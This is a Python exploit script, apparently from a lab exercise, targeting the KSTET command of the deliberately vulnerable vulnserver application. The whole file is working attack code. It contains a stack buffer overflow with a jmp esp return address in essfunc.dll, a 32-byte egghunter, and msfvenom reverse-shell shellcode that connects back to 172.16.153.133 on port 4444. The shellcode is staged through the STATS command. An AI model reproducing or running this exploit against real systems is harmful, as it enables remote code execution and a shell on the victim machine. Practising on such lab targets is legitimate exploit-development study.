#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from sys import exit

rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.153.133 LPORT=4444 -v shellcode -f python -b '\x00' -a x86 --platform windows
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
shellcode =  "w00tw00t"
shellcode += "\xd9\xe9\xbe\x71\xbb\x23\x0b\xd9\x74\x24\xf4\x5a"
shellcode += "\x31\xc9\xb1\x52\x31\x72\x17\x83\xea\xfc\x03\x03"
shellcode += "\xa8\xc1\xfe\x1f\x26\x87\x01\xdf\xb7\xe8\x88\x3a"
shellcode += "\x86\x28\xee\x4f\xb9\x98\x64\x1d\x36\x52\x28\xb5"
shellcode += "\xcd\x16\xe5\xba\x66\x9c\xd3\xf5\x77\x8d\x20\x94"
shellcode += "\xfb\xcc\x74\x76\xc5\x1e\x89\x77\x02\x42\x60\x25"
shellcode += "\xdb\x08\xd7\xd9\x68\x44\xe4\x52\x22\x48\x6c\x87"
shellcode += "\xf3\x6b\x5d\x16\x8f\x35\x7d\x99\x5c\x4e\x34\x81"
shellcode += "\x81\x6b\x8e\x3a\x71\x07\x11\xea\x4b\xe8\xbe\xd3"
shellcode += "\x63\x1b\xbe\x14\x43\xc4\xb5\x6c\xb7\x79\xce\xab"
shellcode += "\xc5\xa5\x5b\x2f\x6d\x2d\xfb\x8b\x8f\xe2\x9a\x58"
shellcode += "\x83\x4f\xe8\x06\x80\x4e\x3d\x3d\xbc\xdb\xc0\x91"
shellcode += "\x34\x9f\xe6\x35\x1c\x7b\x86\x6c\xf8\x2a\xb7\x6e"
shellcode += "\xa3\x93\x1d\xe5\x4e\xc7\x2f\xa4\x06\x24\x02\x56"
shellcode += "\xd7\x22\x15\x25\xe5\xed\x8d\xa1\x45\x65\x08\x36"
shellcode += "\xa9\x5c\xec\xa8\x54\x5f\x0d\xe1\x92\x0b\x5d\x99"
shellcode += "\x33\x34\x36\x59\xbb\xe1\x99\x09\x13\x5a\x5a\xf9"
shellcode += "\xd3\x0a\x32\x13\xdc\x75\x22\x1c\x36\x1e\xc9\xe7"
shellcode += "\xd1\x8d\x1e\x7e\xa4\xa6\x1c\x80\xb6\x6a\xa8\x66"
shellcode += "\xd2\x82\xfc\x31\x4b\x3a\xa5\xc9\xea\xc3\x73\xb4"
shellcode += "\x2d\x4f\x70\x49\xe3\xb8\xfd\x59\x94\x48\x48\x03"
shellcode += "\x33\x56\x66\x2b\xdf\xc5\xed\xab\x96\xf5\xb9\xfc"
shellcode += "\xff\xc8\xb3\x68\x12\x72\x6a\x8e\xef\xe2\x55\x0a"
shellcode += "\x34\xd7\x58\x93\xb9\x63\x7f\x83\x07\x6b\x3b\xf7"
shellcode += "\xd7\x3a\x95\xa1\x91\x94\x57\x1b\x48\x4a\x3e\xcb"
shellcode += "\x0d\xa0\x81\x8d\x11\xed\x77\x71\xa3\x58\xce\x8e"
shellcode += "\x0c\x0d\xc6\xf7\x70\xad\x29\x22\x31\xdd\x63\x6e"
shellcode += "\x10\x76\x2a\xfb\x20\x1b\xcd\xd6\x67\x22\x4e\xd2"
shellcode += "\x17\xd1\x4e\x97\x12\x9d\xc8\x44\x6f\x8e\xbc\x6a"
shellcode += "\xdc\xaf\x94"


# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 41326341
# [*] Exact match at offset 66
expected_payload_len = 1000 + 10  # 10 for the KSTET /.:/
payload = "KSTET /.:/"
payload += "A" * 12
payload += egghunter
payload += "A" * (66 - len(egghunter) - 12)
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\SharedWithVM\vulnerable-apps\vulnserver\essfunc.dll)
payload += pack("<L", 0x62501203)
payload += "A" * 4
payload += "\x71\xBA\x71\xBA"
payload += "C" * (930 - 8 - len(shellcode) - 20)
payload += shellcode
payload += "C" * 20



if len(payload) != expected_payload_len:
    print('[!] Payload length is {x}, expected {y}'.format(x=len(payload), y=expected_payload_len))
    exit(1)

if __name__ == '__main__':
    print('[*] connecting to remote host')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect(target)
        print('[*] receiving the welcome message')
        welcome = s.recv(1024)
        print('[*] received the following message:\n\t{msg}'.format(msg=welcome))

        print('[*] Sending stage 2 shellcode')
        s.send("STATS " + shellcode)
        result = s.recv(1024)
        print('[*] received the following message:\n\t{result}'.format(result=result))
        s.close()
    except timeout:
        print('[!] Timed out waiting for the server. Is it paused in the debugger?')
        exit(1)
    except error:
        print('[!] A socket error occurred. Is the server running')
        exit(1)

    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect(target)
        print('[*] receiving the welcome message')
        welcome = s.recv(1024)
        print('[*] received the following message:\n\t{msg}'.format(msg=welcome))
        s.send(payload)
        print('[*] B00M! ph33r')
    except timeout:
        print('[!] Timed out waiting for the server. Is it paused in the debugger?')
    except error:
        print('[!] A socket error occurred. Is the server running')

